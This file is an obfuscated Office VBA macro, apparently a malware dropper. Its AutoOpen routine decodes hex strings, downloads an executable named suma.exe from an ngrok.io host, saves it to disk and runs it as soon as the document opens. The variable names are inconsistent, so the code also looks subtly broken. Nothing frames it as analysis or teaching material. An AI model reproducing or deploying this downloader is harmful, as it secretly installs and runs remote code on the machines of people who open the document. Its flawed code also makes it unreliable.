
Sub AutoOpen()
Dim xHttp: Set ehzdttfh = CreateObject(zszosptzqylc("4d6963726f736f66742e584d4c") & zszosptzqylc("48545450"))
Dim bStrm: Set drccuubblbhs = CreateObject(zszosptzqylc("41646f64622e5374") & zszosptzqylc("7265616d"))
xHttp.Open zszosptzqylc("474554"), zszosptzqylc("687474703a2f2f6238373764653438646539612e6e67726f6b2e696f2f6578616d70") & zszosptzqylc("6c652f73756d612e657865"), False
xHttp.Send
With drccuubblbhs
.Type = 1 
.Open
.write ehzdttfh.responseBody
.savetofile zszosptzqylc("7375") & zszosptzqylc("6d612e657865"), 2 
End With
Shell (zszosptzqylc("7375") & zszosptzqylc("6d612e657865"))
End Sub

Private Function zszosptzqylc(ByVal afmuttfpwwla ) 
Dim vlmlbknketfa 
For vlmlbknketfa = 1 To Len(afmuttfpwwla) Step 2
zszosptzqylc = zszosptzqylc & Chr(CInt("&H" & Mid(afmuttfpwwla, vlmlbknketfa, 2)))
Next '//vlmlbknketfa
End Function
